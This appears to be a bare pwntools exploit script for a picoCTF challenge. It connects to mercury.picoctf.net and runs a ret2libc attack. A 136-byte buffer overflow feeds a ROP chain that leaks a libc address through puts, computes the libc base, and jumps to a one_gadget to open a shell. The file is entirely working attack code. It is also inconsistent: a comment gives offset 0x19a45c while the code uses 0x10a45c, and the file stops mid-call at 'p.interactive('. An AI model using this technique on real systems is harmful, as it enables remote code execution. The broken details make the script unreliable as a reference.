from pwn import *
p = remote('mercury.picoctf.net', 23584)
elf = ELF("./vuln")
libc = ELF("./libc.so.6")
rop = ROP(elf)

PUTS = elf.plt['puts']
MAIN = elf.symbols['main']
LIBC_START_MAIN = elf.symbols['__libc_start_main']

POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

log.info("puts@plt: " + hex(PUTS))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))


JUNK = ("A"*136).encode()
rop = JUNK
rop += p64(POP_RDI)
rop += p64(LIBC_START_MAIN)
rop += p64(PUTS)
rop += p64(MAIN)

p.sendlineafter("sErVeR!", rop)

p.recvline()
p.recvline()

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))


libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))

rop2 = JUNK
rop2 += p64(RET)
rop2 += p64(POP_RDI)
rop2 += p64(libc.address + 0x10a45c)

# 0x19a45c is found by using one_gadget https://github.com/david942j/one_gadget

rop2 += p64(leak)

p.sendlineafter("sErVeR!", rop2)

p.interactive(
